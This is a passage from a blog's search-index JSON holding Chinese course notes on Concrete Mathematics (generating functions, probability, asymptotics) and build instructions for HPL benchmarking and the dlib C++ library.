<p>\u8003\u8651\u957f\u5ea6\u4e3a mn+1 \u7684 m-Ranny \u6570\u5217\u6709\u591a\u5c11\u4e2a\uff1f</p> <p>n \u4e2a 1-m, L \u4e2a 1\uff0c\u5219\u957f\u5ea6 n+L = nm + 1</p> <p>\u53ef\u8bf4\u660e\uff08\u5229\u7528 Ranny \u5b9a\u7406\uff09</p> <p>\u4e2a\u6570=\\({nm + 1 \\choose n}\\frac{1}{nm+1} = C_n^{(m, 1)}\\)</p> <p>\u7531\u5f15\u7406\uff0c\u6709\uff1a</p> <p>G(z) \u4e3a\\(&lt;C_n^{(m, 1)}&gt;\\)\u7684\u751f\u6210\u51fd\u6570</p> <p>\\(G(z) = zG(z)^m  +1\\)</p> <ul> <li> <p>ranny \u5f15\u7406\u63a8\u5e7f</p> <p>\\(x_1, x_2, ..., x_m\\)\u5e8f\u5217\u548c\u4e3a r\uff0c\u5219\u5176 m \u4e2a\u5faa\u73af\u79fb\u4f4d\u4e2d\u6709 r \u4e2a\u6ee1\u8db3\u90e8\u5206\u548c\u4e3a\u6b63\u3002</p> </li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u6307\u6570\u751f\u6210\u51fd\u6570","title":"\u6307\u6570\u751f\u6210\u51fd\u6570","text":"<ul> <li>\u8fd0\u7b97<ul> <li>\u6c42\u5bfc\uff1a\u5411\u5de6\u79fb</li> <li>\u79ef\u5206\uff1a\u5411\u53f3\u79fb</li> <li>\u4e58\u79ef</li> </ul> </li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#8-\u79bb\u6563\u6982\u7387","title":"8 \u79bb\u6563\u6982\u7387","text":"<ul> <li>\u6982\u7387\u7a7a\u95f4 (probability space)</li> <li>\u57fa\u672c\u4e8b\u4ef6 (elementary event) \\(\\omega \\in \\Omega\\)</li> <li>\u8d4b\u4e88\u57fa\u672c\u4e8b\u4ef6\u4e00\u4e2a\u6982\u7387\\(Pr(\\omega)\\)\uff0c\u6ee1\u8db3\u975e\u8d1f\uff0c\u548c\u4e3a 1</li> <li>\u6982\u7387\u5206\u5e03 (probability distribution)</li> <li>\u4e8b\u4ef6 (event)A \u662f\u6982\u7387\u7a7a\u95f4\u7684\u4e00\u4e2a\u5b50\u96c6\uff0c\u6982\u7387\u5b9a\u4e49\u4e3a\u57fa\u672c\u4e8b\u4ef6\u6982\u7387\u4e4b\u548c</li> <li>\u968f\u673a\u53d8\u91cf\uff08random variable\uff09\uff0c\u662f\u5b9a\u4e49\u5728\u6982\u7387\u7a7a\u95f4\u7684\u57fa\u672c\u4e8b\u4ef6\\(\\omega\\)\u4e0a\u7684\u51fd\u6570\u3002\u6bd4\u5982\u9ab0\u5b50\u70b9\u6570\u4e4b\u548c\u3002<ul> <li>\\(X: \\Omega \\to set of value\\)</li> <li>\u968f\u673a\u53d8\u91cf\u4f7f\u5f97\u6211\u4eec\u4e0d\u7528\u7814\u7a76\u6574\u4e2a\u6982\u7387\u7a7a\u95f4\uff0c\u800c\u53ea\u7528\u7814\u7a76\u6211\u4eec\u5173\u5fc3\u7684\u91cf\u3002</li> </ul> </li> <li>\u72ec\u7acb (independent)<ul> <li>\u4e8b\u4ef6\u72ec\u7acb\uff1f</li> <li>\u968f\u673a\u53d8\u91cf\u72ec\u7acb\uff1a\\(P(X=x, Y = y) = P(X=x) P(Y= y)\\)</li> </ul> </li> <li>\u5747\u503c\uff0c\u671f\u671b\u503c (expected value)\uff1a\\(EX = \\sum_{\\omega}X(\\omega)Pr(\\omega) = \\sum_{x \\in X(\\omega)}xPr(X=x)\\)</li> <li>\u4e2d\u4f4d\u6570\uff1a\\(P(X\\le x)\\ge 1/2\\)\u4e14\\(P(X\\ge x) \\ge 1/2\\)</li> <li>\u4f17\u6570\uff1a\\(P(X=x) \\ge P(X=x'), \\forall x' \\in X(\\Omega)\\)</li> </ul> <ul> <li> <p>\u671f\u671b</p> <ul> <li>\u53ef\u52a0\uff08\u5b9a\u4e49\u5728\u540c\u4e00\u4e2a\u6982\u7387\u7a7a\u95f4\u4e0a\uff0c\u6216\u72ec\u7acb\uff09:\\(E(X+Y) = \\sum_{\\omega} (X(\\omega) + Y(\\omega))P(\\omega) = EX + EY\\)</li> </ul> <ul> <li>\u4e58\u79ef\uff08\u72ec\u7acb\uff09\uff1a   $$   \\begin{aligned}   &amp;\\mathrm{E}(X Y)=\\sum_{\\omega \\in \\Omega} X(\\omega) Y(\\omega) \\cdot \\operatorname{Pr}(\\omega)\\   &amp;=\\sum_{\\substack{x \\in X(\\Omega) \\ y \\in Y(\\Omega)}} x y \\cdot \\operatorname{Pr}(X=x \\text { \u4e14 } Y=y)\\   &amp;=\\sum_{\\substack{x \\in X(\\Omega) \\ y \\in Y(\\Omega)}} x y \\cdot \\operatorname{Pr}(X=x) \\operatorname{Pr}(Y=y)   \\end{aligned}   $$</li> </ul> </li> </ul> <ul> <li>\u65b9\u5dee\uff1a\\(DX = E(X^2) - (EX)^2\\)</li> </ul> <ul> <li> <p>\u5207\u6bd4\u96ea\u592b\u4e0d\u7b49\u5f0f\uff1a\\(Pr((X-EX)^2 \\ge \\alpha)\\le \\frac{Var(X)}{\\alpha}\\)</p> <ul> <li>\\(\\operatorname{Pr}(|X-\\mu| \\geqslant c \\sigma) \\leqslant 1 / c^{2}\\)</li> </ul> </li> </ul> <ul> <li> <p>Markov \u4e0d\u7b49\u5f0f\uff1a\\(X\\ge 0, \\lambda&gt;0\\)\uff0c\u6709\\(Pr(X\\ge\\lambda) \\le \\frac{EX}{\\lambda}\\)</p> <ul> <li>\u76f4\u63a5\u5bfc\u51fa\u5207\u6bd4\u96ea\u592b\u4e0d\u7b49\u5f0f</li> </ul> <ul> <li>\u8fd8\u6709\uff1a\\(Pr(f(X)\\ge f(\\lambda)) \\le \\frac{Ef(X)}{f(\\lambda)}\\), f(x) &gt; 0\uff0c\u5355\u8c03\u589e\u3002</li> </ul> </li> </ul> <ul> <li> <p>\u7528\u6837\u672c\u4f30\u8ba1\u671f\u671b\uff0c\u65b9\u5dee</p> <ul> <li>\\(\\hat{E} = \\frac{1}{n}\\sum_{k}X_k\\)</li> <li>\\(\\hat{V} = \\frac{1}{n-1}\\sum_k (X_k - \\hat{E})^2 = \\frac{1}{n-1} \\sum_k X_k^2 - \\frac{1}{n(n-1)}(\\sum_k E_k)^2\\)<ul> <li>\u56e0\u4e3a\\(E\\hat{V} = DX\\)</li> </ul> </li> </ul> </li> </ul> <ul> <li>\u8003\u8651\u7b2c 5 \u7ae0\u7684\u201c\u8db3\u7403\u80dc\u5229\u95ee\u9898\u201d\uff0c\u5728\u8be5\u95ee\u9898\u4e2d\u6709 n \u9876\u5e3d\u5b50\u88ab\u629b\u5411\u7a7a\u4e2d\uff0c\u6709 k \u4e2a\u4eba\u5f97\u5230\u81ea\u5df1\u7684\u5e3d\u5b50\u3002<ul> <li>\u53ef\u4ee5\u5728\u4e0d\u8ba1\u7b97\u6982\u7387\u5206\u5e03\u7684\u60c5\u51b5\u4e0b\uff0c\u8ba1\u7b97\u5747\u503c\u548c\u65b9\u5dee</li> <li>\\(F_n = F_{n,1}+F_{n,2}+\\dots + F_{n,n}\\)\uff0c\\(F_{n, k}\\)\u8868\u793a\u7b2c k \u4e2a\u4eba\u662f\u5426\u62ff\u5230\u81ea\u5df1\u5e3d\u5b50</li> <li>\\(EF_{n,k} = 1/n\\), \\(EF_n = 1\\)</li> <li>$EF_n^2 = $</li> </ul> </li> </ul> <p>\u6982\u7387\u751f\u6210\u51fd\u6570</p> <ul> <li>pgf \u4e58\u79ef\u5bf9\u5e94\u968f\u673a\u53d8\u91cf\u548c\u7684\u5206\u5e03</li> </ul> <ul> <li> <p>\u7d2f\u79ef\u91cf\uff08cumulant\uff09</p> <ul> <li>\u7d2f\u79ef\u91cf\u72ec\u7acb\u53ef\u52a0</li> <li></li> </ul> </li> </ul> <ul> <li> <p>m \u9636\u77e9\uff08m th moment\uff09</p> <p></p> <p></p> </li> </ul> <ul> <li> <p>\u201c\u9636\u4e58\u77e9\u201d\uff0c\uff08\\(\\alpha_m = G^{(m)}(1)\\)</p> <p></p> <p></p> </li> </ul> <p>\u629b\u786c\u5e01</p> <ul> <li>\u4e8c\u9879\u5206\u5e03</li> </ul> <ul> <li> <p>\u8d1f\u4e8c\u9879\u5206\u5e03\uff08\u548c\u5e15\u65af\u5361\u5206\u5e03\u7c7b\u4f3c\uff09\uff1a\u629b\u51fa n \u6b21\u6b63\u9762\u65f6\uff0c\u53cd\u9762\u7684\u6b21\u6570</p> <ul> <li>\u5012\u6570\u751f\u6210\u51fd\u6570\uff0c\u65b9\u4fbf\u8ba1\u7b97\u65b9\u5dee</li> </ul> </li> </ul> <ul> <li>\u6709\u9650\u72b6\u6001\u673a</li> </ul> <ul> <li> <p>\u9a6c\u5c14\u53ef\u592b\u8fc7\u7a0b</p> <p>\u72b6\u6001\u95f4\u8f6c\u79fb\u90fd\u5f15\u5bfc\u51fa\u4e00\u7ec4\u8054\u7acb\u7ebf\u6027\u65b9\u7a0b\uff0c\u5b83\u4eec\u7684\u89e3\u5c31\u662f\u5728\u51fa\u73b0 n \u6b21\u8f6c\u79fb\u4e4b\u540e\u72b6\u6001\u6982\u7387\u7684\u751f\u6210\u51fd \u6570\uff0e\u8fd9\u79cd\u7cfb\u7edf\u79f0\u4e3a\u9a6c\u5c14\u53ef\u592b\u8fc7\u7a0b</p> </li> </ul> <ul> <li> <p>\u8003\u8651\u4e0d\u51fa\u73b0\u6a21\u5f0f\u7684\u7684\u548c\u5f0f</p> <p>\\(1 + N(H + T) = N + S\\)</p> <p>\u5176\u4e2d\u7684 1 \u8003\u8651\u4e86\u4e00\u6b21\u4e0d\u629b\u7684\u60c5\u51b5\u3002\u5373 N = 1 + H + T + ... \u3002\u5982\u679c\u4e0d\u8003\u8651\u8fd9\u79cd\u60c5\u51b5\uff0c\u5219</p> <p>\\(H + T + N(H + T) = N + S\\)</p> </li> </ul> <ul> <li> <p>\u516c\u5f0f (8.73)</p> <p>\\(NA = S(1 + A^{(1)}[A^{(1)}=A_{(1)}] + A^{(2)}[A^{(2)}=A_{(2)}] + ...)\\)</p> </li> </ul> <ul> <li>\u516c\u5f0f (8.74) (8.75) \u76f4\u63a5\u8ba1\u7b97\u671f\u671b\u4e0e\u65b9\u5dee</li> </ul> <ul> <li>\u81ea\u6211\u4e0d\u91cd\u53e0\u7684\u6a21\u5f0f\u8981\u6bd4\u81ea\u6211\u6709\u91cd\u53e0\u7684\u6a21\u5f0f\u51fa\u73b0\u5f97\u66f4\u65e9</li> </ul> <ul> <li> <p>Penney \u8d4c\u6ce8\u6e38\u620f</p> <ul> <li></li> </ul> <ul> <li>\u5e26\u5165 H= T + 1/2\uff0c\u53ef\u76f4\u63a5\u5f97\\(S_A = 2/3, S_B = 1/3\\)</li> </ul> <ul> <li> <p>\u6f02\u4eae\u7684\u516c\u5f0f</p> <p></p> </li> </ul> </li> </ul> <ul> <li>\u6563\u5217\uff08\u6ca1\u8bb2\uff09</li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#9-\u6e10\u8fdb\u5f0f","title":"9 \u6e10\u8fdb\u5f0f","text":"<ul> <li> <p>\u6e10\u8fdb</p> <p></p> </li> </ul> <ul> <li> <p>\u91cf\u7684\u7b49\u7ea7</p> <p></p> </li> </ul> <p>\u5927 O \u8bb0\u53f7</p> <ul> <li> <p>\\(f(n) = O(g(n)) \\(\uff0c\u5219\u5b58\u5728\u5e38\u6570\\)C\\)</p> <p>\\(|f(n)| \\le C|g(n)|, n\\ge n_0\\)</p> </li> </ul> <ul> <li>\u5355\u5411\u7b49\u53f7\uff1a\u7b49\u4e8e\u53f7\u5b9e\u9645\u4e0a\u8868\u793a\u96c6\u5408\u5305\u542b\u4e8e</li> </ul> <p>O \u8fd0\u7b97\u89c4\u5219</p> <ul> <li>\\(O(O(f)) = O(f)\\)</li> </ul> <ul> <li>\\(O(f)O(g) = O(fg) = fO(g)\\)</li> </ul> <ul> <li> <p>\u5e42\u7ea7\u6570\u622a\u65ad\u539f\u7406\uff08\u53ea\u9700\u8981 S(z) \u5bf9\u67d0\u4e2a\u975e 0 z \u7edd\u5bf9\u6536\u655b\uff09</p> <p></p> <p>\u72c4\u5229\u514b\u96f7\u7ea7\u6570\u622a\u65ad</p> <p></p> <p>\u5e94\u7528</p> <p></p> </li> </ul> <ul> <li>\u622a\u65ad\u53d1\u6563\u7ea7\u6570\u6240\u5f97\u5230\u7684\u8fd1\u4f3c\u516c\u5f0f\u662f\u6709\u7528\u7684</li> </ul> <ul> <li> <p>\u8868 9-1</p> <p></p> <ul> <li> <p>\u5bf9\u4e8e</p> <p>\\(\\sqrt{x+1} = 1 + 1/2x -1/8x^2 + 1/16x^3 + O(x^4)\\)</p> </li> </ul> </li> </ul> <ul> <li> <p>\u7edd\u5bf9\u8bef\u5dee\uff0c\u76f8\u5bf9\u8bef\u5dee</p> <p>\\(f + O(g)\\), \\(f(1+O(g))\\)</p> <ul> <li>\u7edd\u5bf9\u8bef\u5dee\u4e0e\u5c0f\u6570\u70b9\u53f3\u8fb9\u6b63\u786e\u7684\u5341\u8fdb\u5236\u6570\u5b57\u7684\u4e2a\u6570\u6709\u5173\uff0c\u800c\u76f8\u5bf9\u8bef\u5dee\u5219\u5bf9\u5e94\u4e8e\u6b63\u786e\u7684\u201c\u6709\u6548\u6570\u5b57\u201d\u7684\u4e2a\u6570</li> <li>\u65af\u7279\u6797\u516c\u5f0f\u7684\u7edd\u5bf9\u8bef\u5dee\u4e3a\\(O(n^{n-3.5}e^n)\\)</li> <li>\u76f8\u5bf9\u8bef\u5dee\u5f62\u5f0f\u4e3a</li> </ul> </li> </ul> <ul> <li></li> </ul> <ul> <li></li> </ul> <ul> <li>\u62bd\u51fa\u6700\u5927\u7684\u90e8\u5206</li> </ul> <ul> <li> <p>\u95ee\u9898 2\uff1a\u65af\u7279\u6797\u516c\u5f0f\u7684\u6270\u52a8\u6cd5</p> <p></p> <p></p> <p></p> <p></p> <p></p> </li> </ul> <ul> <li> <p>\u95ee\u9898 3\uff1a\u7b2c n \u4e2a\u7d20\u6570</p> <p></p> <p></p> <p>\uff089.44\uff09</p> <p></p> <p>(9.45)</p> <p></p> <p>\u63a5\u4e0b\u6765\u53bb\u9664 (9.45) \u53f3\u4fa7\u7684 p\uff0c\u5229\u7528\\(p = O(n^2)\\)</p> <p></p> <p>\u518d\u7531 (9.45)</p> <p></p> <p>\u5e26\u5165 (9.44)</p> <p></p> </li> </ul> <ul> <li> <p>\u95ee\u9898 4\uff1a\u4ee5\u524d\u671f\u672b\u8003\u8bd5\u4e2d\u7684\u548c\u5f0f</p> <p></p> <p>\u65b9\u5f0f\u4e00\uff1a</p> <p></p> <p>\u65b9\u5f0f\u4e8c\uff1a</p> <p></p> </li> </ul> <ul> <li> <p>\u95ee\u9898 5\uff1a\u65e0\u9650\u548c\u5f0f</p> <p></p> <p>\u7cbe\u5999\u7684\u8f6c\u6362</p> <p></p> <p>\u5206\u7ec4</p> <p></p> <p></p> <p></p> <p></p> <p>\u53ef\u4ee5\u622a\u65ad</p> <p></p> </li> </ul> <ul> <li> <p>\u95ee\u9898 6\uff1a\u5927 \\(\\Phi\\)</p> <p></p> <p></p> <p>\u8ba1\u7b97\u65f6\uff0c</p> <p></p> <p>\u65b0\u52a0\u7684\u9879</p> <p></p> </li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u4e24\u4e2a\u6e10\u8fdb\u6280\u5de7","title":"\u4e24\u4e2a\u6e10\u8fdb\u6280\u5de7","text":"<ul> <li> <p>\u81ea\u52a9\u6cd5</p> <ul> <li> <p>\u751f\u6210\u51fd\u6570\u6c42\u5bfc\uff0c\u5f97\u5230\u9012\u63a8\u5f0f</p> <p></p> <p></p> <p></p> </li> </ul> <ul> <li>\u4e00\u4e2a\u4e0d\u7b49\u5f0f</li> </ul> <p></p> </li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u6b27\u62c9\u6c42\u548c\u516c\u5f0f","title":"\u6b27\u62c9\u6c42\u548c\u516c\u5f0f","text":"<ul> <li> <p>\u5f62\u5f0f\u4e0a\u7684\u8bc1\u660e</p> <p>\\(\\Delta = e^D - 1\\)</p> <p>\\(\\Sigma = \\frac{1}{\\Delta} = \\frac{1}{e^D - 1} = \\frac{1}{D} \\hat{B}(D)\\)</p> <p></p> </li> </ul> <ul> <li> <p>\u5f52\u7eb3\u6cd5\u8bc1\u660e</p> <ul> <li> <p>\u53ea\u9700\u8bc1\u660e a=0, b= 1 \u65f6\u6210\u7acb</p> <p></p> <ul> <li> <p>\u5219 L \u65f6\uff0c\u6709</p> <p></p> </li> </ul> </li> </ul> <ul> <li> <p>\u4f2f\u52aa\u5229\u591a\u9879\u5f0f</p> <ul> <li></li> <li></li> </ul> </li> </ul> <ul> <li> <p>\u5bf9 m \u8fdb\u884c\u5f52\u7eb3</p> <ul> <li> <p>m = 0</p> <p></p> </li> </ul> </li> </ul> </li> </ul> <ul> <li> <p>\u4f2f\u52aa\u5229\u591a\u9879\u5f0f\u603b\u7ed3</p> <ul> <li> <p>\u53ef\u4ee5\u5206\u6790\u51fa\u5355\u8c03\u6027\uff0c\u6b63\u8d1f\u6027\u4ee5 4 \u4e3a\u5468\u671f\u3002</p> <ul> <li>0\uff0c1 \u4e0a\u79ef\u5206\u4e3a 0</li> <li></li> <li>\\(B_{4k+1}\\)\u7684\u79ef\u5206\u5bf9\u5e94\\(B_{4k+2}/4k+2\\)\uff0c\u53ef\u4ee5\u5206\u6790\u51fa\\(B_{4k+2}\\)\u7684\u5355\u8c03\u6027</li> <li>\u6709</li> <li></li> <li>\u4ece\u800c\\(B_{2m}\\)\u5728 0\uff0c1 \u4e0a\u6700\u5927\u503c\u5728 0 \u6216 1/2 \u5904\u53d6\u5f97</li> <li></li> </ul> <p></p> </li> </ul> </li> </ul> <ul> <li> <p>\u6b27\u62c9\u6c42\u548c\u516c\u5f0f</p> <ul> <li>9.78</li> </ul> <ul> <li></li> </ul> <ul> <li> <p>\u518d\u6b21\u6539\u8fdb</p> <ul> <li>\u4f59\u9879\u5c06\u4f4d\u4e8e 0 \u7b2c\u4e00\u4e2a\u88ab\u629b\u5f03\u7684\u9879\u4e4b\u95f4</li> <li>\u597d\u50cf\u6709\u524d\u63d0\u6761\u4ef6<ul> <li></li> <li></li> </ul> </li> </ul> <p></p> </li> </ul> <ul> <li> <p>\u7b80\u5355\u7684\u5e38\u6570\u9879\u7248\u6b27\u62c9\u6c42\u548c\u516c\u5f0f</p> <ul> <li></li> </ul> <p></p> </li> </ul> <ul> <li> <p>\u8c03\u548c\u7ea7\u6570</p> <p></p> </li> </ul> <ul> <li> <p>\u65af\u7279\u6797\u516c\u5f0f</p> <ul> <li>\u65af\u7279\u6797\u5e38\u6570</li> <li></li> <li></li> <li></li> </ul> </li> </ul> </li> </ul>","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0/2023/04/20/2023-04-20-%E5%85%B7%E4%BD%93%E6%95%B0%E5%AD%A6/#\u56f0\u96be\u7684\u8bc1\u660e\u9898","title":"\u56f0\u96be\u7684\u8bc1\u660e\u9898","text":"","tags":["math","\u5177\u4f53\u6570\u5b66"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/02/16/2020-02-16-HPL-complie/","title":"\u8fd0\u884c HPL","text":"","tags":["hpl"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/02/16/2020-02-16-HPL-complie/#\u7f16\u8bd1-blascblas","title":"\u7f16\u8bd1 BLAS/CBLAS","text":"<p>BLAS \u4e3a fortran \u63a5\u53e3\u7684\u5e93\uff0cCBLAS \u4e3a C \u8bed\u8a00\u63a5\u53e3\u7684\u5e93</p> <pre><code> tar zxf blas-3.8.0.tgz \n tar zxf cblas.tgz\n cd BLAS-3.8.0\n make #\u751f\u6210blas_LINUX.a\n cp blas_LINUX.a ../CBLAS\n cd ../CBLAS\n vi Makefile.in\n #\u4fee\u6539\n # BLLIB = ../blas_LINUX.a\n make #\u5728lib/\u4e0b\u751f\u6210cblas_LINUX.a\n</code></pre>","tags":["hpl"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/02/16/2020-02-16-HPL-complie/#\u7f16\u8bd1-hpl","title":"\u7f16\u8bd1 HPL","text":"<pre><code>tar zxf hpl-2.3.tar.gz \ncd hpl-2.3\ncp setup/Make.Linux_PII_CBLAS ./Make.&lt;arch&gt; #\u5728top-level \u6587\u4ef6\u5939\u4e0b\nvi Make.&lt;arch&gt; #\u4fee\u6539\nmake &lt;arch&gt; #\u5728bin/&lt;arch&gt;/\u4e0b\u751f\u6210HPL.dat xhpl\n</code></pre>","tags":["hpl"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/02/16/2020-02-16-HPL-complie/#make\u793a\u4f8b","title":"Make.\u793a\u4f8b","text":"","tags":["hpl"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/02/16/2020-02-16-HPL-complie/#openmpicblas","title":"OpenMPI+CBLAS","text":"<pre><code>ARCH         = &lt;arch&gt;\n\nTOPdir       = /home/mpiuser/hpl-2.3\n\nMPdir        = /path/to/OpenMPI\nMPinc        = -I$(MPdir)/include\nMPlib        = $(MPdir)/lib/libmpi.so\n\nLAdir        = \nLAinc        = \nLAlib        = path/to/cblas_LINUX.a path/to/blas_LINUX.a #\u987a\u5e8f\u4e0d\u80fd\u6539\u53d8\uff0ccblas\u4f9d\u8d56blas\n\nHPL_OPTS     = -DHPL_CALL_CBLAS \n\nCC           = mpicc\nLINKER       = mpif77\n</code></pre>","tags":["hpl"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/02/16/2020-02-16-HPL-complie/#hpl-\u4f18\u5316","title":"HPL \u4f18\u5316","text":"","tags":["hpl"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/02/16/2020-02-16-HPL-complie/#\u914d\u7f6e\u53c2\u6570","title":"\u914d\u7f6e\u53c2\u6570 <p>\u8ba1\u7b97\u6b21\u6570\uff1a</p> \\[ \\#Ns \\times \\#NBs \\times \\#(Ps, Qs) \\times \\#PFACTs \\times \\#NBMINs \\times \\#BCASTs \\times \\#DEPTHs \\] <pre><code>HPLinpack benchmark input file\nInnovative Computing Laboratory, University of Tennessee\nHPL.out      output file name (if any)\n6            device out (6=stdout,7=stderr,file)\n1            # of problems sizes (N)\n8192         Ns\n1            # of NBs\n128          NBs\n0            PMAP process mapping (0=Row-,1=Column-major)\n3            # of process grids (P x Q)\n2 1 4        Ps\n2 4 1        Qs\n16.0         threshold\n3            # of panel fact\n0 1 2        PFACTs (0=left, 1=Crout, 2=Right)\n2            # of recursive stopping criterium\n2 4          NBMINs (&gt;= 1)\n2            # of panels in recursion\n2            NDIVs\n3            # of recursive panel fact.\n0 1 2        RFACTs (0=left, 1=Crout, 2=Right)\n1            # of broadcast\n0            BCASTs (0=1rg,1=1rM,2=2rg,3=2rM,4=Lng,5=LnM)\n1            # of lookahead depth\n0            DEPTHs (&gt;=0)\n2            SWAP (0=bin-exch,1=long,2=mix)\n64           swapping threshold\n0            L1 in (0=transposed,1=no-transposed) form\n0            U  in (0=transposed,1=no-transposed) form\n1            Equilibration (0=no,1=yes)\n8            memory alignment in double (&gt; 0)\n</code></pre>","text":"","tags":["hpl"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/","title":"Use dlib in C++","text":"","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#use-dlib-in-c","title":"use dlib in c++","text":"<p>\u4ece\u65b9\u6cd5 1.1 \u5230 1.3 \u90fd\u4e0d\u5fc5\u9884\u7f16\u8bd1 dlib \u5e93\uff0c\u800c\u662f\u5728\u4f7f\u7528 dlib \u7684\u9879\u76ee\u4e2d\u7f16\u8bd1\u3002</p> <p>\u65b9\u6cd5 1.4 \u4ecb\u7ecd\u4e86\u5c06 dlib \u9884\u7f16\u8bd1\u6210\u9759\u6001\u5e93\u7136\u540e\u4f7f\u7528\u65f6\u4f1a\u9047\u5230\u7684\u4e00\u4e9b\u95ee\u9898\u3002</p>","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#with-cmakeofficially-recommend","title":"with CMake(officially recommend)","text":"<p>\u770b<code>dlib/example/CMakeLists.txt</code></p> <pre><code>cmake_minimum_required(VERSION 2.8.12)\n\nproject(examples)\n\n# Tell cmake we will need dlib.  This command will pull in dlib and compile it\n# into your project.  Note that you don't need to compile or install dlib.  All\n# cmake needs is the dlib source code folder and it will take care of everything.\nadd_subdirectory(./dlib dlib_build)\n\nmacro(add_example name)\n   add_executable(${name} ${name}.cpp)\n   target_link_libraries(${name} dlib::dlib )\nendmacro()\n\n# if an example requires GUI, call this macro to check DLIB_NO_GUI_SUPPORT to include or exclude\nmacro(add_gui_example name)\n   if (DLIB_NO_GUI_SUPPORT)\n      message(\"No GUI support, so we won't build the ${name} example.\")\n   else()\n      add_example(${name})\n   endif()\nendmacro()\n\n# \nadd_gui_example(3d_point_cloud_ex)\n</code></pre> <p>\u547d\u4ee4\u884c\u6267\u884c\uff1a</p> <pre><code>mkdir build\ncd build\ncmake .. -G \"Visual Studio 14 2015 Win64\" -T host=x64 #-T host=x64\u544a\u8bc9CMake\u751f\u621064bit\u7684\u53ef\u6267\u884c\u6587\u4ef6\u3002\u5176\u5b9e\u5b89\u88c5\u4e86\u6700\u65b0\u7684VisualStudio\u540e\uff0c-G -T\u90fd\u4e0d\u7528\u6307\u5b9a\uff0c\u9ed8\u8ba4\u4f7f\u7528\u6700\u65b0\u7684VisualStudio\uff0c\u9ed8\u8ba464\u4f4d\u3002\ncmake --build . --config Release\n</code></pre> <p>\u4f7f\u7528 CMake GUI \u53ef\u4ee5\u8bbe\u7f6e\u4e00\u4e9b\u9009\u9879\uff0cconfigure, generate \u4e4b\u540e\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u884c\u6267\u884c\u6700\u540e\u4e00\u6b65 (\u4e0d\u7528\u6253\u5f00 VisualStudio)</p>","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#with-gcc-in-terminal","title":"with GCC in terminal","text":"<pre><code>g++ -std=c++11 -O3 -I.. ../dlib/all/source.cpp -lpthread -lX11 example_program_name.cpp\n</code></pre> <p>windows \u4e0b\u8fd8\u9700<code>gdi32, comctl32, user32, winmm, ws2_32, or imm32</code>\u5e93</p>","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#with-visualstudio","title":"with VisualStudio","text":"<ul> <li> <p>\u628a dlib \u7684\u7236\u76ee\u5f55\u6dfb\u52a0\u5230 include search path</p> <p>You should NOT add the dlib folder itself to your compiler's include path. Doing so will cause the build to fail because of name collisions (such as dlib/string.h and string.h from the standard library). Instead you should add the folder that contains the dlib folder to your include search path and then use include statements of the form #include  or","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#include-dlibqueueh-this-will-ensure-that-everything-builds-correctly","title":"include \"dlib/queue.h\".  This will ensure that everything builds correctly.","text":"<ul> <li> <p>\u628a dlib/all/source.cpp \u6dfb\u52a0\u5230\u6e90\u6587\u4ef6</p> <p>If you are using Visual Studio you add .cpp files to your application using the solution explorer window.  Specifically, right click on Source Files, then select Add -&gt; Existing Item and select the .cpp files you want to add.</p> </li> </ul> <ul> <li>\u5982\u679c\u9700\u8981 libjpeg \u7b49\uff0c\u628a dlib/external \u6587\u4ef6\u5939\u4e0b\u7684\u6e90\u6587\u4ef6\u6dfb\u52a0\u5230 project\uff0c\u5e76 define the DLIB_PNG_SUPPORT and DLIB_JPEG_SUPPORT preprocessor directives.</li> </ul>","tags":["dlib","cpp"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2020/03/01/2020-02-29-use-dlib-in-c%2B%2B/#installing-dlib-as-a-precompiled-library","title":"Installing dlib as a precompiled library","text":"<p>dlib \u7684 CMake \u811a\u672c\u5305\u542b INSTALL 